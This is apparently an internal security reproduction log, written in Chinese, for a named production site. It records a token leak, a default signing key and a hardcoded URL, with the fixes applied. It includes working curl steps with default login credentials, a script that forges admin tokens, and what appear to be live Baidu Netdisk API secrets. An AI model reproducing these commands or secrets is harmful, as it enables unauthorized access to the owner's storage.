# 安全漏洞复现记录

> 日期：2026-07-15
> 测试工具：Strix 自动化扫描 + 手动验证
> 测试环境：wlm.cdqzsta.tech（生产环境）

---

## 🔴 漏洞 1：AList 管理 Token 泄露（CVSS 9.9 Critical）

### 描述

任意有 `upload` 权限的用户（包括 manager）可获取 AList 管理员 JWT token，进而通过 AList 管理 API 读取百度网盘存储凭证（refresh_token、access_token、client_id、client_secret）。

### 复现步骤

```bash
# 1. 用 manager 账号登录
curl -s https://wlm.cdqzsta.tech/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"manager","password":"manager"}'

# 返回 manager 的 JWT token
# {"token":"eyJxxx.xxx.xxx","role":"manager",...}

# 2. 用 manager token 获取 AList 管理员 JWT
curl -s https://wlm.cdqzsta.tech/api/alist-token \
  -X POST \
  -H "Authorization: Bearer <manager_token>"

# 返回 AList 管理员 JWT（payload 内 username=admin）
# {"token":"eyJxxx...","url":"https://pan.tantantan.tech"}

# 3. 用 AList 管理员 token 读取百度网盘凭证
curl -s "https://pan.tantantan.tech/api/admin/storage/list" \
  -H "Authorization: <alist_admin_token>"
```

### 获取的敏感数据

```json
{
  "refresh_token": "122.ab1fab072e90d0f94debc2d2ae31af6d.YDfDBucrc20yHk30vpLcoMUMJyOcGb_1II73hjT.YzaOHQ",
  "access_token": "121.06eccbe423169c6203f0a10d4ed4b732.YCpzNxCTmmi0eisKFibnmITTAmr960qrZZXwXXx.JDgy3A",
  "client_id": "hq9yQ9w9kR4YHj1kyYafLygVocobh7Sf",
  "client_secret": "YH2VpZcFJHYNnV6vLfHQXDBhcE7ZChyE"
}
```

持有 `refresh_token` + `client_id` + `client_secret` 后可：

- 直接调用百度网盘官方 API，完全绕过 AList 和网站权限控制
- 任意上传、下载、删除、列目录

### 修复

- 文件：`src/app/api/alist-token/route.ts`
- 修复方式：调用者从 `upload` 权限改为 `admin` 角色限制
- commit：`e255e06`（WLM）/ `72855bc`（主站）
- 部署后需重启 AList：`docker restart alist`

---

## ⚠️ 漏洞 2：ADMIN_TOKEN_SECRET 默认密钥（CVSS 7.5 High）

### 描述

`ADMIN_TOKEN_SECRET` 环境变量未设置时，代码 fallback 到硬编码字符串 `'default-secret-change-me'`，攻击者可伪造任意角色 token。

### 验证方法

```bash
# 用默认密钥伪造 admin token 调 API
python3 -c "
import base64, json, hmac, hashlib
payload = base64.urlsafe_b64encode(json.dumps({
    'iat': 0, 'exp': 9999999999999,
    'username': 'admin', 'role': 'admin'
}).encode()).rstrip(b'=').decode()
sig = hmac.new(b'default-secret-change-me', payload.encode(), hashlib.sha256).hexdigest()
print(f'{payload}.{sig}')
"

curl -s https://wlm.cdqzsta.tech/api/users \
  -H "Authorization: Bearer <伪造的token>"
```

返回 200 → 未设置环境变量，漏洞存在
返回 401 → 已设置环境变量，安全

### 修复

确认 ECS 上 `.env.local` 或环境变量中已设置 `ADMIN_TOKEN_SECRET`，且不是 `default-secret-change-me`。

---

## 🟡 漏洞 3：viewer.html 硬编码后端 URL（CVSS 5.3 Medium）

### 描述

`/pdfjs/viewer.html` 中包含硬编码的 fallback PDF URL，暴露后端域名、文件路径结构、AList 签名。

```javascript
// 旧版本 viewer.html
if(!pdfUrl){
  pdfUrl='https://pan.tantantan.tech/pdf-preview/sta/新媒体素材/.../《未来梦》Vol.20.pdf?sign=ZgQCQ-...'
}
```

### 修复

已移除 fallback URL，无参数时显示"未指定文件"。
commit：`e255e06`

---

## ❌ 误报清单

| 报告内容 | 分析结论 |
|---------|---------|
| `/api/global-settings` 无认证泄露配置 | 公开 API，只返回 UI 开关量（访客模式、下载通道等），不含敏感配置 |
| JWT 签名验证绕过，CVSS 10.0 | 测试者使用了无需鉴权的 `/api/check-risk`。`_auth.ts` 第 72-75 行明确做 HMAC-SHA256 签名验证 |
| `alist-download` 绕过 PDF 预览保护 | 下载 API 本意就是下载。预览保护靠权限控制，不是靠隐藏下载入口 |
| BFLA — Manager 可访问 admin API | 设计如此，按 `mgPermissions` 风险分级粒度控制 |

### JWT 签名验证代码（正常）

```typescript
// src/app/api/_auth.ts
const hmac = crypto.createHmac('sha256', secret);
hmac.update(payloadB64);
const expectedSig = hmac.digest('hex');
if (expectedSig !== sig) return null;  // 签名校验
```
